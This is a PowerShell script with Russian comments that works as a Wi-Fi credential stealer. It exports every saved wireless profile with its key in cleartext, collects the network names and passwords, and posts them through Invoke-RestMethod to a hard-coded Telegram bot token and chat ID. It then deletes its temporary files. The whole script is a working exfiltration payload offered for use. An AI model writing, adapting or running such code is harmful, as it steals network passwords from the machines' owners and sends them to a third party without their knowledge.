# Параметры бота Telegram
$BotToken = "8013680506:AAHzKXQVcb7fE0WYWo_faMCogkHnqPm33ak"
$ChatID = "259082534"

# Функция для логирования
function Write-Log {
    param([string]$Message)
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "$TimeStamp - $Message"
    Write-Host $LogMessage
    $LogMessage | Out-File -FilePath "$env:TEMP\wifi_script.log" -Append
}

Write-Log "=== Начало выполнения скрипта ==="

try {
    # Сбор данных Wi-Fi
    Write-Log "Создание временной директории..."
    $TempDir = "$env:temp\wifi-passwords"
    New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
    Set-Location $TempDir

    Write-Log "Экспорт профилей Wi-Fi..."
    netsh wlan export profile key=clear
    Write-Log "Экспорт профилей завершен."

    # Формируем текстовое сообщение с паролями
    $Message = "📶 Сохраненные пароли Wi-Fi:`n`n"

    $XmlFiles = Get-ChildItem -Path "*.xml"
    Write-Log "Найдено XML-файлов: $($XmlFiles.Count)"

    foreach ($file in $XmlFiles) {
        $XmlData = [xml](Get-Content $file.FullName)
        $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
        $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
        $Message += "🔹 **SSID:** $SSID`n"
        $Message += "🔸 **Пароль:** $Password`n`n"
        Remove-Item $file.FullName
    }

    Write-Log "Сформировано сообщение длиной: $($Message.Length) символов"

    # Отправляем сообщение в Telegram
    $TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendMessage"
    Write-Log "URL API: $TelegramAPIUrl"

    $Body = @{
        chat_id = $ChatID
        text = $Message
        parse_mode = "Markdown"
    }

    Write-Log "Отправка запроса к Telegram API..."
    
    # Пытаемся отправить сообщение
    $Response = Invoke-RestMethod -Uri $TelegramAPIUrl -Body $Body -Method Post -ErrorAction Stop
    
    Write-Log "✅ Сообщение успешно отправлено в Telegram!"
    Write-Log "Ответ API: $($Response | ConvertTo-Json -Compress)"

} catch {
    Write-Log "❌ Ошибка при отправке сообщения: $($_.Exception.Message)"
    
    # Дополнительная информация об ошибке
    if ($_.Exception.Response) {
        $ErrorStream = $_.Exception.Response.GetResponseStream()
        $StreamReader = New-Object System.IO.StreamReader($ErrorStream)
        $ErrorResponse = $StreamReader.ReadToEnd()
        $StreamReader.Close()
        Write-Log "Подробности ошибки: $ErrorResponse"
    }
} finally {
    # Очистка
    if (Test-Path $TempDir) {
        Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log "Временная директория очищена."
    }
    Write-Log "=== Завершение выполнения скрипта ==="
}
